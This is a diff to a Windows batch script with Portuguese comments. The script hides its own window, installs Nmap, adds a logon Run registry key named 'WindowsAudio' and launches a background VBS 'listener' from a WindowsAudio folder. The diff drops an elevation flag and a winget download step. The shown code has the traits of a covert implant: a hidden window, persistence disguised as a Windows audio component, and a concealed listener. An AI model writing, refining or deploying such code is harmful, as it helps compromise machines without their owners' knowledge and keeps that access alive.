@@ -1,15 +1,9 @@
 @echo off
 :: Ocultar esta janela imediatamente
 if not "%1"=="hidden" (
-    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden -Verb RunAs"
+    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" hidden' -WindowStyle Hidden"
     exit
 )
-
-echo [*] Baixando Winget...
-curl -L -o "%TEMP%\winget.msixbundle" "https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle" > nul 2>&1
-    
-echo [*] Instalando Winget...
-start "" /wait "%TEMP%\winget.msixbundle"
 
 :: Instalar Nmap
 echo [*] Instalando Nmap...
@@ -38,6 +32,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\WindowsAudio\audio.vbs"
 
-:: Limpar e sair
-del "%TEMP%\winget.msixbundle" > nul 2>&1
 exit
